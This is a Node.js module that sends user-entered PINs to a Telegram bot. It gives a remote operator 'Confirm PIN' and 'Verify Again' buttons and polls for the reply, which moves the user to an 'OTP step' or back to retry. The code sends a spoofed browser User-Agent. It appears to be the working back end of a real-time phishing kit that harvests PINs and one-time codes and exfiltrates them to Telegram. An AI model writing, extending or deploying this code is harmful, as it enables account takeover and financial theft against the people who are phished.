const fetch = require('node-fetch');
require('dotenv').config();

const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;

// 1. Optimized Message Sender (Fire-and-forget for speed)
const sendTelegramMessage = async (message) => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  // Notice: Removed 'await' here so the frontend doesn't wait for Telegram to respond
  fetch(url, {
    method: 'POST',
    headers: { 
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' 
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    })
  }).catch(err => console.error("📡 Telegram Sync Error:", err.message));
};

/**
 * 2. Optimized Admin Approval Request
 */
const sendAdminApprovalRequest = async (applicationId, pin, io) => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: `🔐 <b>PIN Verification Required</b>\n\n` +
          `<b>App ID:</b> <code>${applicationId}</code>\n` +
          `<b>Entered PIN:</b> <code>${pin}</code>\n\n` +
          `Please take action:`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [[
        { text: "✅ Confirm PIN", callback_data: `approve_${applicationId}` },
        { text: "🔄 Verify Again", callback_data: `reject_${applicationId}` }
      ]]
    }
  };

  // We await this specific one only because we need the 'ok' status to start polling
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
      },
      body: JSON.stringify(payload)
    });
    
    const data = await res.json();
    if (data.ok) {
      console.log(`✨ Admin Buttons Sent for App: ${applicationId}`);
      startPollingForApproval(io);
    }
  } catch (err) {
    console.error("📡 Admin Request Failed:", err.message);
  }
};

/**
 * 3. Polling Logic with faster cycle
 */
let lastUpdateId = 0;
const startPollingForApproval = async (io) => {
  // Low timeout (5s) for getUpdates keeps the connection fresh without hanging Render
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;

  try {
    const res = await fetch(url);
    const data = await res.json();

    if (data.ok && data.result.length > 0) {
      for (const update of data.result) {
        lastUpdateId = update.update_id;

        if (update.callback_query) {
          const callbackData = update.callback_query.data;
          const [action, appId] = callbackData.split('_');

          if (action === 'approve') {
            io.to(appId).emit('admin-approved');
            sendTelegramMessage(`✅ <b>Approved:</b> App <code>${appId}</code> moved to OTP step.`);
          } 
          else if (action === 'reject') {
            io.to(appId).emit('admin-rejected');
            sendTelegramMessage(`🔄 <b>Rejected:</b> App <code>${appId}</code> reset for retry.`);
          }
        }
      }
    }
    // Reduced delay for snappier responses
    setTimeout(() => startPollingForApproval(io), 500); 
  } catch (err) {
    // If error (like internet blip), wait longer before retrying to avoid spamming logs
    setTimeout(() => startPollingForApproval(io), 2000);
  }
};

module.exports = { sendTelegramMessage, sendAdminApprovalRequest };